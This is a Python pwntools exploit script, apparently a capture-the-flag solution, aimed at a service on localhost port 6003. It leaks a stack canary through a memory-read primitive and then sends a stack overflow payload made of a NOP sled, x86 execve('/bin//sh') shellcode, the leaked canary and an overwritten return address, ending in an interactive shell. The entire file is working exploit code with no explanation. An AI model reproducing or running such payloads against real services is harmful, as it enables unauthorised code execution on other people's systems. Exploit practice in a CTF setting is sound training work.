#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys

from pwn import *

WIN_FUNCTION = 0x80406cd

NOP_OPERATOR = '\x90'
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

def get_canary_value(r, canary_address):
    print "[+] Getting canary value"

    r.sendline( 'a' )
    response = r.recvrepeat(0.2)

    r.sendline(str(4))
    r.send( p32(canary_address) )
    response = r.recvrepeat(0.2)

    r.sendline( 'b' )
    response = r.recvrepeat(0.2)
    print response

    canary_value = response.split('\n')[0].encode('hex').split("3a20")[1][:16]
    print "[!!] Primitive ", response.split('\n')[0].encode('hex').split("3a20")[1][:36]
    print "[!] Extracted canary : ", canary_value
    high_canary = int("0x{}".format(canary_value[:8]), 16)
    low_canary = int("0x{}".format(canary_value[8:]), 16)
    print "[+] Canary value : high = {} || low = {} ".format(
        canary_value[:8],
        canary_value[8:])

    return (high_canary, low_canary)

def get_canary_address(r, canary_offset):
    response = r.recvrepeat(0.2)
    print "[!] Extracting canary address"
    given_address = int(response.split('\n')[1][-10:], 16)
    canary_address = given_address + canary_offset
    return (given_address, canary_address)

def send_exploit(r, canary_value, given_address):
    print "[+] Sending exploit"
    r.sendline( 'a' )
    canary_offset = 140 - 44 - len(SHELLCODE)
    ret_eip_offset = 12

    print "[+] Calculated offset : ", canary_offset

    r.sendline(NOP_OPERATOR * canary_offset
        + SHELLCODE
        + p32( canary_value[0], endian="big")
        + NOP_OPERATOR * ret_eip_offset
        + p32( given_address + 70 )
    )


def main(canary_offset):
    target = "localhost"
    port = "6003"
    i = 0

    r = remote( target, port )

    (given_address, canary_address) = get_canary_address(r, canary_offset)

    canary_value = get_canary_value(r, canary_address)

    send_exploit(r, canary_value, given_address)

    canary_value = get_canary_value(r, canary_address)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python stackdump.py <canary_offset>"
        exit(0)

    main(int(sys.argv[1]))
